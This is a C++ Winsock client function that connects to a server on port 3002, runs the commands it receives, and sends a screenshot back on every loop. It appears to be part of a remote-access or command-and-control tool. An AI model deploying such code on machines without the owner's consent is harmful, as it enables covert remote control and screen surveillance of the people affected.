#include "networking.h"
const int DEFAULT_PORT = 3002;

int network::reworkedClient(char ip[])
{
	device::print("[Network] [+] Connecting to %s:%d...", ip, DEFAULT_PORT);

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		std::cerr << "Failed to init winsock.\n";
		return -1;
	}

	SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
	if (clientSocket == INVALID_SOCKET)
	{
		std::cerr << "Failed to create client socket.\n";
		WSACleanup();
		return -1;
	}

	sockaddr_in serverAddress;
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = inet_addr(ip);
	serverAddress.sin_port = htons(DEFAULT_PORT);

	if (connect(clientSocket, reinterpret_cast<sockaddr*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR)
	{
		std::cerr << "Failed to connect to the server.\n";
		closesocket(clientSocket);
		WSACleanup();
		return -1;
	}

	device::print("[Network] [+] Connected to %s:%d!", ip, DEFAULT_PORT);

	CommandHandler commandHandler;

	while(true)
	{
		auto data = networking::recvData(clientSocket);

		device::print("[Network] [+] Server: %s", data);

		if(data == NULL)
		{
			device::ErrorWindow("Connection lost!");
			return -1;
		}

		networking::ServerPacket serverPacket;
		serverPacket.parse(data);

		if(serverPacket.information == "Shutdown")
		{
			closesocket(clientSocket);
			WSACleanup();
			exit(0);
		}

		commandHandler.setInput(serverPacket.command);

		data.clear();
		serverPacket.clear();

		networking::ClientPacket clientPacket;
		clientPacket.resp = "handled";
		clientPacket.screenData = commands::Screenshot_C();
		nlohmann::json clientData = clientPacket.create();

		commandHandler.callFunction();
		commandHandler.clear();

		device::print("[Network] [+] Sending data...");
		networking::sendData(clientSocket, clientData);
		device::print("[Network] [+] Data sent!\n");
	}

	closesocket(clientSocket);
	WSACleanup();

	return 0;
}